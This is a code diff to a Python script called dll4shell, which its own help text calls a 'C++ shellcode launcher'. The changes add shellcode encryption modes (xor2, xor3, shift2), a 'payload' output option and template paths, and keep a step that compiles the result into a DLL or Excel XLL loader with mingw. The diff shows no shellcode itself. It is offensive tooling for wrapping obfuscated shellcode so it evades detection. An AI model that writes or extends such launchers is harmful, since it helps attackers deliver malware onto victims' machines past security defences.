@@ -67,7 +67,7 @@ def dll4shell(enctype, output):
     
     print("[*]                    Replacing data in dll4shell.cpp...           [*]")
 
-    template = open("template-" + output + "-" + enctype + ".cpp", "rt")
+    template = open("Templates/template-" + output + "-" + enctype + ".cpp", "rt")
 
     data = template.read()
 
@@ -115,19 +115,19 @@ def main():
     parser = argparse.ArgumentParser(description='C++ shellcode launcher')
     parser.add_argument("-e", "--encryption",
                     dest="enc",
-                    help="Shellcode encryption (xor, xor1, shift, shift1)",
+                    help="Shellcode encryption (xor, xor1, xor2, xor3, shift, shift1, shift2)",
                     default="xor",
                     action='store')
     parser.add_argument("-o", "--output",
                 dest="out",
-                help="Output format (dll or xll)",
+                help="Output format (dll, xll, payload)",
                 default="dll",
                 action='store')
 
     args = parser.parse_args()
 
     try:
-        f = open("template-"+ args.out + "-" + args.enc + ".cpp")
+        f = open("Templates/template-"+ args.out + "-" + args.enc + ".cpp")        
     except IOError:
         print("Params combination does not exist. Check templates file names.")
         sys.exit(1)
@@ -135,6 +135,10 @@ def main():
 
     e1 = dll4shell(args.enc,args.out)
     
+    if "payload" in args.out: 
+        print("[*]                    Payload saved to dll4shell.cpp    [*]")
+        sys.exit(1)
+
     print("[*]                    Completed - Compiling dll4shell.dll         [*]")
     time.sleep(1)
     os.system("x86_64-w64-mingw32-g++ -shared -o dll4shell." + args.out + " dll4shell.cpp -fpermissive")
